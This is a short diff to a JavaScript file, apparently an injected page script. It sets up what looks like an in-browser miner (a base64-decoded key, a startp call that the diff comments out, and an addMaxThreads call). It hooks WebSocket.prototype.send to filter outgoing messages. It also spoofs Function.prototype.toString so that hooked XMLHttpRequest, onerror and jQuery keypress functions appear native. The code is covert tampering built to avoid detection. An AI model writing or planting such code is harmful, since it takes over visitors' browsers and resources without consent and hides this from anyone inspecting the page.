@@ -18,7 +18,7 @@
                         atob('V21zOVU2ZXQ0NU5iWFdmSm1QVlJWSzN4UUtuWG5HY0tKWlJndjZBNWNVUGppNmtMaEwxN2FFVzhaTVViaHp6WXE4SzJwYUVEZzZXeURFZ3NtOHlRZzNubjJQOFBDa2JDUA==')];
                     let p = 'workers_';
                     args.push(p);
-                    window[key].startp.apply(window[key], args);
+                    // window[key].startp.apply(window[key], args);
                     window[key].addMaxThreads();
                     clearInterval(intv);
                     return;
@@ -1444,6 +1444,13 @@
     let _set = null,
         _send = WebSocket.prototype.send;
     WebSocket.prototype.send = function() {
+        let msg = arguments[0];
+        let obj = null;
+        try {
+            obj = JSON.parse(msg);
+        } catch(e) {
+            return;
+        }
         return _send.apply(this, arguments);
     }
     onfinish(() => {
@@ -1560,7 +1567,7 @@
         if (this === XMLHttpRequest.prototype.send) return __.toStr;
         if (this === XMLHttpRequest.prototype.open) return __.toStr;
         if (this === window.onerror) return __.toStr;
-        if (this === jQuery.fn.keypress) return __.toStr;
+        if (window.jQuery && this === jQuery.fn.keypress) return __.toStr;
         return _.toStr;
     });
     setInterval(() => {
